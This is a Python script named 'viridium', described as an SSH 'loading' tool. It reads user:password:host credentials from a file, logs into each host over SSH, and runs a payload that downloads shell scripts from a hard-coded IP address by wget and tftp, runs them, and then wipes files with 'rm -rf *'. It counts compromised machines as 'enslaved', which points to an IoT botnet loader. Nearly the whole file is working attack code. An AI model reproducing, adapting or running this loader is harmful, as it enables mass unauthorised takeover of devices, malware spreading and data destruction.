# [=========================================]
#        (_)    (_)   | (_)                
#  __   ___ _ __ _  __| |_ _   _ _ __ ___  
#  \ \ / / | '__| |/ _` | | | | | '_ ` _ \ 
#   \ V /| | |  | | (_| | | |_| | | | | | |
#    \_/ |_|_|  |_|\__,_|_|\__,_|_| |_| |_|
#    viridium - ssh loading, done easy
#    [important] > python viridium.py (creds)
#    [important] > ulimit -n 999999
#    [important] > change payload='PAYLOAD_HERE'
#    [creds]     > created by social
# [=========================================]
import multiprocessing
import warnings
import paramiko
import socket
import time
import sys
import os
from multiprocessing import Value
from os import system, name

paramiko.util.log_to_file("/dev/null")
warnings.simplefilter(action="ignore", category=FutureWarning)
payload="wget http://139.59.170.98/cayosinbins.sh; chmod 777 cayosinbins.sh; sh cayosinbins.sh; tftp 139.59.170.98 -c get cayosintftp1.sh; chmod 777 cayosintftp1.sh; sh cayosintftp1.sh; tftp -r cayosintftp2.sh -g 139.59.170.98; chmod 777 cayosintftp2.sh; sh cayosintftp2.sh; rm -rf cayosinbins.sh cayosintftp1.sh cayosintftp2.sh; rm -rf *" 

with open(sys.argv[1], "r") as fd:
    lines = fd.readlines()
ATT = Value('i', 0)
FCONN = Value('i', 0)
FAUTH = Value('i', 0)
IoT = Value('i', 0)

def viridium(creds):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(creds[2], port=22, username=creds[0], password=creds[1], timeout=5)
        stdin, stdout, stderr = ssh.exec_command(payload)
        time.sleep(10)
        ssh.close()
        global IoT
        with IoT.get_lock():
            IoT.value += 1
        global ATT
        with ATT.get_lock():
            ATT.value += 1
        print("viridium : (online) => || attempted : [%d] || enslaved : [%d] || failedConns : [%d] || failedAuths : [%d] ||"% (ATT.value, IoT.value, FCONN.value, FAUTH.value))
        return
    except paramiko.ssh_exception.AuthenticationException:
        global FAUTH
        with FAUTH.get_lock():
            FAUTH.value += 1
        global ATT
        with ATT.get_lock():
            ATT.value += 1
        print("viridium : (online) => || attempted : [%d] || enslaved : [%d] || failedConns : [%d] || failedAuths : [%d] ||"% (ATT.value, IoT.value, FCONN.value, FAUTH.value))
        return
    except socket.error:
        global FCONN
        with FCONN.get_lock():
            FCONN.value += 1
        global ATT
        with ATT.get_lock():
            ATT.value += 1
        print("viridium : (online) => || attempted : [%d] || enslaved : [%d] || failedConns : [%d] || failedAuths : [%d] ||"% (ATT.value, IoT.value, FCONN.value, FAUTH.value))
        return
    except:
        global FCONN
        with FCONN.get_lock():
            FCONN.value += 1
        global ATT
        with ATT.get_lock():
            ATT.value += 1
        print("viridium : (online) => || attempted : [%d] || enslaved : [%d] || failedConns : [%d] || failedAuths : [%d] ||"% (ATT.value, IoT.value, FCONN.value, FAUTH.value))
        pass

for line in lines:
    creds = line.strip().split(":")
    multiprocessing.Process(target=viridium, args=(creds,)).start()